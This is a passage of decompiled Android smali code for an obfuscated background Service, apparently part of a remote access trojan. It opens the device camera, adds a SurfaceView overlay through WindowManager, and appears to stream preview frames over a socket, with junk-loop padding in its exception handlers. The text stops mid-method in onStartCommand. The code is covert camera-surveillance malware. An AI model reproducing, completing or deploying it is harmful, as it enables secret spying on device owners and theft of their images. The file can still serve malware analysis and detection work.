.class public Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;
.super Landroid/app/Service;
.source ""

# interfaces
.implements Landroid/view/SurfaceHolder$Callback;


# static fields
.field public static g:Landroid/hardware/Camera;

.field public static h:Ljava/net/Socket;

.field public static i:Ljava/io/OutputStream;

.field public static j:Landroid/view/WindowManager;

.field public static k:Landroid/view/SurfaceView;

.field public static l:Landroid/view/WindowManager$LayoutParams;

.field private static m:Ljava/lang/Object;


# instance fields
.field public a:Z

.field public b:Z

.field public c:Z

.field private d:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List<",
            "[B>;"
        }
    .end annotation
.end field

.field private e:[Ljava/lang/String;

.field private f:I


# direct methods
.method static constructor <clinit>()V
    .locals 1

    new-instance v0, Ljava/lang/Object;

    invoke-direct {v0}, Ljava/lang/Object;-><init>()V

    sput-object v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->m:Ljava/lang/Object;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->a:Z

    iput-boolean v0, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->b:Z

    iput-boolean v0, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->c:Z

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->d:Ljava/util/List;

    const/16 v0, 0x46

    iput v0, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->f:I

    return-void
.end method

.method static synthetic b(Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;)V
    .locals 0

    invoke-direct {p0}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->j()V

    return-void
.end method

.method static synthetic c()Ljava/lang/Object;
    .locals 1

    sget-object v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->m:Ljava/lang/Object;

    return-object v0
.end method

.method static synthetic d(Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;)Ljava/util/List;
    .locals 0

    iget-object p0, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->d:Ljava/util/List;

    return-object p0
.end method

.method static synthetic e(Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;)[Ljava/lang/String;
    .locals 0

    iget-object p0, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->e:[Ljava/lang/String;

    return-object p0
.end method

.method static synthetic f(Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;)I
    .locals 0

    iget p0, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->f:I

    return p0
.end method

.method static synthetic g(Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;I)I
    .locals 0

    iput p1, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->f:I

    return p1
.end method

.method static synthetic h(Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;II)I
    .locals 0

    invoke-direct {p0, p1, p2}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->l(II)I

    move-result p0

    return p0
.end method

.method private j()V
    .locals 2

    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->c:Z

    sput-boolean v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3/hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71;->o:Z

    :try_start_0
    sget-object v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->h:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->shutdownOutput()V
    :try_end_0
    .catch Ljava/net/SocketException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_8

    :catch_0
    sget-object v0, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    :goto_0
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_0

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_0

    :cond_0
    :goto_1
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_1

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_1

    :cond_1
    :goto_2
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_2

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_2

    :cond_2
    :goto_3
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_6

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_3

    :catch_1
    sget-object v0, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    :goto_4
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_3

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_4

    :cond_3
    :goto_5
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_4

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_5

    :cond_4
    :goto_6
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_5

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_6

    :cond_5
    :goto_7
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_6

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_7

    :cond_6
    :goto_8
    :try_start_1
    sget-object v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->h:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->shutdownInput()V
    :try_end_1
    .catch Ljava/net/SocketException; {:try_start_1 .. :try_end_1} :catch_2
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_2

    :catch_2
    :try_start_2
    sget-object v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->h:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v0

    invoke-virtual {v0}, Ljava/io/OutputStream;->close()V
    :try_end_2
    .catch Ljava/net/SocketException; {:try_start_2 .. :try_end_2} :catch_3
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_3

    :catch_3
    :try_start_3
    sget-object v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->h:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v0

    invoke-virtual {v0}, Ljava/io/InputStream;->close()V
    :try_end_3
    .catch Ljava/net/SocketException; {:try_start_3 .. :try_end_3} :catch_4
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_4

    :catch_4
    :try_start_4
    sget-object v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->h:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->close()V
    :try_end_4
    .catch Ljava/net/SocketException; {:try_start_4 .. :try_end_4} :catch_5
    .catch Ljava/io/IOException; {:try_start_4 .. :try_end_4} :catch_5

    goto :goto_9

    :catch_5
    nop

    :goto_9
    sget-object v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->i:Ljava/io/OutputStream;

    if-eqz v0, :cond_7

    :try_start_5
    invoke-virtual {v0}, Ljava/io/OutputStream;->close()V
    :try_end_5
    .catch Ljava/net/SocketException; {:try_start_5 .. :try_end_5} :catch_6
    .catch Ljava/io/IOException; {:try_start_5 .. :try_end_5} :catch_6

    :catch_6
    const/4 v0, 0x0

    sput-object v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->i:Ljava/io/OutputStream;

    :cond_7
    return-void
.end method

.method private l(II)I
    .locals 1

    const v0, 0xf000

    if-le p1, v0, :cond_0

    const/16 p2, 0xf

    goto :goto_0

    :cond_0
    const v0, 0xc800

    if-le p1, v0, :cond_1

    const/16 p2, 0x19

    goto :goto_0

    :cond_1
    const v0, 0xa000

    if-le p1, v0, :cond_2

    const/16 p2, 0x23

    goto :goto_0

    :cond_2
    const/16 v0, 0x7800

    if-le p1, v0, :cond_3

    const/16 p2, 0x2d

    goto :goto_0

    :cond_3
    const/16 v0, 0x5000

    if-le p1, v0, :cond_4

    const/16 p2, 0x41

    goto :goto_0

    :cond_4
    const/16 v0, 0x2800

    if-le p1, v0, :cond_5

    const/16 p2, 0x4b

    :cond_5
    :goto_0
    return p2
.end method


# virtual methods
.method public a(Ljava/lang/String;I)V
    .locals 2

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12$a;

    invoke-direct {v1, p0, p1, p2}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12$a;-><init>(Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;Ljava/lang/String;I)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public i()Z
    .locals 1

    :try_start_0
    invoke-static {}, Landroid/hardware/Camera;->open()Landroid/hardware/Camera;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/RuntimeException; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Landroid/hardware/Camera;->release()V

    :cond_0
    const/4 v0, 0x0

    return v0

    :catchall_0
    move-exception v0

    throw v0

    :catch_0
    const/4 v0, 0x1

    return v0
.end method

.method public k()V
    .locals 2

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12$c;

    invoke-direct {v1, p0}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12$c;-><init>(Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public m()V
    .locals 2

    :try_start_0
    sget-object v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->g:Landroid/hardware/Camera;

    if-eqz v0, :cond_0

    sget-object v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->g:Landroid/hardware/Camera;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/hardware/Camera;->setPreviewCallback(Landroid/hardware/Camera$PreviewCallback;)V

    sget-object v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->g:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->release()V

    sput-object v1, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->g:Landroid/hardware/Camera;

    :cond_0
    invoke-direct {p0}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->j()V

    iget-boolean v0, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->a:Z

    if-nez v0, :cond_1

    sget-object v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3/hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72;->C:Landroid/view/WindowManager;

    sget-object v1, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->k:Landroid/view/SurfaceView;

    invoke-interface {v0, v1}, Landroid/view/WindowManager;->removeView(Landroid/view/View;)V

    :cond_1
    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->a:Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_4

    :catch_0
    sget-object v0, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    :goto_0
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_2

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_0

    :cond_2
    :goto_1
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_3

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_1

    :cond_3
    :goto_2
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_4

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_2

    :cond_4
    :goto_3
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_5

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_3

    :cond_5
    :goto_4
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Landroid/app/Service;->stopService(Landroid/content/Intent;)Z

    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public onDestroy()V
    .locals 1

    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    const/4 v0, 0x0

    sput v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/d;->B:I

    invoke-virtual {p0}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->m()V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 19

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    const/4 v2, 0x2

    :try_start_0
    new-instance v3, Landroid/content/Intent;

    invoke-virtual/range {p0 .. p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    const-class v5, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/utrwrkgcoszzetveklqskawdjgejdycnriijuwnlwjpiutrpty14_CA;

    invoke-direct {v3, v4, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v4, "xyz"

    invoke-virtual {v3, v4}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v3

    invoke-virtual {v0, v3}, Landroid/app/Service;->sendBroadcast(Landroid/content/Intent;)V

    sget-object v3, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/e;->d:Ljava/lang/String;

    const/4 v4, 0x1

    if-eqz v1, :cond_3

    invoke-virtual {v1, v3}, Landroid/content/Intent;->hasExtra(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_3

    sget-object v5, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3/hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72;->C:Landroid/view/WindowManager;

    const/16 v6, 0x33

    if-eqz v5, :cond_1

    sget-object v5, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3/hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72;->D:Landroid/view/WindowManager$LayoutParams;

    if-eqz v5, :cond_1

    invoke-virtual {v1, v3}, Landroid/content/Intent;->getStringArrayExtra(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->e:[Ljava/lang/String;

    invoke-virtual/range {p0 .. p0}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->i()Z

    move-result v1

    iput-boolean v1, v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->a:Z

    if-nez v1, :cond_0

    new-instance v1, Landroid/view/SurfaceView;

    invoke-direct {v1, v0}, Landroid/view/SurfaceView;-><init>(Landroid/content/Context;)V

    sput-object v1, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->k:Landroid/view/SurfaceView;

    sget-object v1, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3/hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72;->D:Landroid/view/WindowManager$LayoutParams;

    iput v6, v1, Landroid/view/WindowManager$LayoutParams;->gravity:I

    sget-object v1, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3/hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72;->C:Landroid/view/WindowManager;

    sget-object v3, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->k:Landroid/view/SurfaceView;

    sget-object v5, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3/hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72;->D:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {v1, v3, v5}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    sget-object v1, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->k:Landroid/view/SurfaceView;

    invoke-virtual {v1}, Landroid/view/SurfaceView;->getHolder()Landroid/view/SurfaceHolder;

    move-result-object v1

    invoke-interface {v1, v0}, Landroid/view/SurfaceHolder;->addCallback(Landroid/view/SurfaceHolder$Callback;)V

